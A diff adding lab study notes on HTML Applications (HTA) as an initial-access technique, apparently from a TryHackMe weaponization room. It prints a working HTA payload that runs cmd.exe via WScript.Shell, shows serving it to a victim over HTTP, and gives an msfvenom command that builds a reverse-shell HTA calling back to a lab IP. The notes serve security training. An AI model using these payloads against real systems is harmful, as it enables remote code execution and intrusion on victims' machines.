@@ -32,6 +32,44 @@
 
 # [Task 4  An HTML Application - HTA]()
 
+### An HTML Application (HTA)
+- HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.
+- HTML Applications, also known as HTAs, which are dynamic `HTML` pages containing JScript and VBScript. 
+- The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute HTA files. 
+- It can be executed by itself or automatically from Internet Explorer. 
+
+#### In the following example, we will use an [`ActiveXObject`](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute `cmd.exe`. 
+- Consider the following HTML code.
+```hta
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+```
+- Then serve the `payload.hta` from a web server, this could be done from the attacking machine as follows,
+```cmd
+python3 -m http.server 8090
+```
+- On the victim machine, visit the malicious link using Microsoft Edge, `http://10.8.232.37:8090/payload.hta`. Note that the `10.8.232.37` is the AttackBox's IP address.
+  > ![image](https://user-images.githubusercontent.com/51442719/180656414-2cc1cad9-0fc5-4cc0-9cc1-087a192999ae.png)
+- Once we press `Run`, the `payload.hta` gets executed, and then it will invoke the `cmd.exe`. 
+- The following figure shows that we have successfully executed the `cmd.exe`.
+  > ![image](https://user-images.githubusercontent.com/51442719/180656440-dda92953-4d5e-4541-8dec-74e52b781866.png)
+
+#### HTA Reverse Connection
+- We can create a reverse shell payload as follows,
+```cmd
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+```
+
+
+
+
+
 ---
 
 # [Task 5  Visual Basic for Application - VBA]()
